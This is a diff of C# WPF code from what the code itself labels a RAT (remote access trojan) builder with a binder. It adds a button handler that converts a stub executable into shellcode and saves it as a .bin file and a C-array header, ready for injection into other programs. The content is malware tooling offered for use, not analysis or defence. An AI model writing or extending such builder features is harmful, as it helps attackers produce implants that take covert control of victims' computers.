@@ -4463,6 +4463,63 @@ Read-Host 'Press Enter to close'
         }
     }
 
+    private async void ExportShellcode_Click(object sender, RoutedEventArgs e)
+    {
+        var openDlg = new Microsoft.Win32.OpenFileDialog
+        {
+            Filter = "Executable (*.exe)|*.exe",
+            Title  = Lang.Get("SC_SELECT_STUB"),
+        };
+        if (openDlg.ShowDialog() != true) return;
+        var stubExe = openDlg.FileName;
+
+        var saveDlg = new Microsoft.Win32.SaveFileDialog
+        {
+            Filter   = "Binary (*.bin)|*.bin|All files (*.*)|*.*",
+            FileName = "shellcode.bin",
+            Title    = Lang.Get("SC_SAVE_TITLE"),
+        };
+        if (saveDlg.ShowDialog() != true) return;
+        var outPath = saveDlg.FileName;
+
+        BtnExportShellcode.IsEnabled = false;
+        TxtBuildStatus.Text = Lang.Get("SC_STATUS_GEN");
+        Log("[*] Shellcode: Starting export...");
+
+        try
+        {
+            var blob = await SeroServer.Builder.ShellcodeExport.BuildAsync(stubExe, Log);
+            if (blob == null)
+            {
+                TxtBuildStatus.Text = Lang.Get("SC_STATUS_FAILED");
+                return;
+            }
+
+            await File.WriteAllBytesAsync(outPath, blob);
+
+            // Also write a .h C-array alongside the .bin
+            var hPath = Path.ChangeExtension(outPath, ".h");
+            await File.WriteAllTextAsync(hPath, SeroServer.Builder.ShellcodeExport.ToCArray(blob));
+
+            var sizeStr = blob.Length < 1024 * 1024
+                ? $"{blob.Length / 1024.0:F0} KB"
+                : $"{blob.Length / (1024.0 * 1024.0):F1} MB";
+
+            Log($"[+] Shellcode: {Path.GetFileName(outPath)} ({blob.Length:N0} bytes)");
+            Log($"[+] Shellcode: C array → {Path.GetFileName(hPath)}");
+            TxtBuildStatus.Text = $"Shellcode: {Path.GetFileName(outPath)} ({sizeStr})";
+        }
+        catch (Exception ex)
+        {
+            Log($"[!] Shellcode export: {ex.Message}");
+            TxtBuildStatus.Text = $"Error: {ex.Message}";
+        }
+        finally
+        {
+            BtnExportShellcode.IsEnabled = true;
+        }
+    }
+
     private void ShowBuildResult(string fileName, string sizeStr)
     {
         var bg  = (System.Windows.Media.SolidColorBrush)FindResource("WindowBgBrush");
@@ -8768,6 +8825,7 @@ Read-Host 'Press Enter to close'
 
         // ── RAT builder + Binder build buttons ──
         if (TxtBtnBuild       != null) TxtBtnBuild.Text       = Lang.Get("ACT_BUILD").ToUpper();
+        if (TxtBtnShellcode   != null) TxtBtnShellcode.Text   = Lang.Get("SC_BTN");
         if (BtnBinderBuildTxt != null) BtnBinderBuildTxt.Text = Lang.Get("ACT_BUILD");
     }
 
